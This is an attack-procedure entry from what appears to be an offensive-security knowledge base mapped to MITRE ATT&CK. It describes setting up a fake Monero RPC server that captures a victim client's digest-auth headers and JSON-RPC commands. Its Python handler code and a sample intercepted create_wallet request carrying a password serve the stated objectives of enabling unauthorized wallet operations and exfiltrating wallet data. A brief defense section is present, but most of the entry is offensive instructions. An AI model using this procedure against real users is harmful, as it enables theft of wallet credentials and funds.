---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
tags:
  - command-interception
  - wallet-creation
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/create-wallet-rpc]]'
verified: false
platforms:
  - Linux
  - macOS
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Adversary-in-the-Middle]]'
  - '[[Automated Collection]]'
updated_at: '2025-12-14T17:29:10.114Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Adversary-in-the-Middle]]'
  - '[[Automated Collection]]'
---
# Intercept-Client-Commands-via-Fake-Server

## Summary

This procedure captures RPC commands sent by the victim's client to the fake server, exploiting HTTP digest auth to log sensitive operations like wallet creation without needing the victim's password.

## Description

The client authenticates using digest (MD5(username:realm:password:nonce:method:URI)), but the server doesn't prove its identity. The fake server issues challenges, accepts the response, and logs the JSON-RPC payload, allowing the attacker to replay or act on commands like 'create_wallet' to generate attacker-controlled accounts.

## Requirements

1. Fake server running and handling digest auth
2. Victim's RPC client configured to connect to localhost:RPC_PORT
3. Knowledge of Monero RPC methods (JSON over HTTP POST)

## Defense

Defensive measures and detection strategies:

- Mandate TLS with mutual auth or client certificates for RPC
- Validate server identity in clients (e.g., check for expected responses or certs)
- Log and alert on anomalous RPC commands or multiple auth attempts

## Objectives

1. Capture client authentication and commands
2. Enable unauthorized wallet operations
3. Exfiltrate or misuse wallet data

## Instructions

### Step 1: Handle Client Connection and Auth

**Context**: Client connects and sends auth; fake server challenges and logs.

In fake server code (extend from Step 2 of previous procedure):
Add digest handling:
```python
# In do_POST, before logging:
if 'Authorization' not in self.headers and 'WWW-Authenticate' not in self.headers:
    self.send_response(401)
    self.send_header('WWW-Authenticate', 'Digest realm="Monero", nonce="abc123"')
    self.end_headers()
else:
    # Validate digest if needed, but log anyway
    print(f"Auth: {self.headers['Authorization']}")
    # Proceed to log post_data
```

> Client receives 401, resends with digest; server logs credentials hash.

### Step 2: Intercept Specific Commands

**Context**: Log and process commands like create_wallet.

Execute [[commands/create-wallet-rpc]] interception:
The client sends:
```json
POST /json_rpc HTTP/1.1
Content-Type: application/json
Authorization: Digest username="user", realm="Monero", nonce="abc123", uri="/json_rpc", response="md5hash"

{"jsonrpc":"2.0","id":"0","method":"create_wallet","params":{"filename":"new_wallet","password":"victimpass"}}
```

> Fake server logs full JSON; attacker uses params to create wallet elsewhere.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Adversary-in-the-Middle]] Adversary-in-the-Middle
- [[Automated Collection]] Automated Collection

### Sub-Techniques

- None

## Commands Used

- [[commands/create-wallet-rpc]]

## Tools Used

- None

## Tags

- command-interception
- wallet-creation
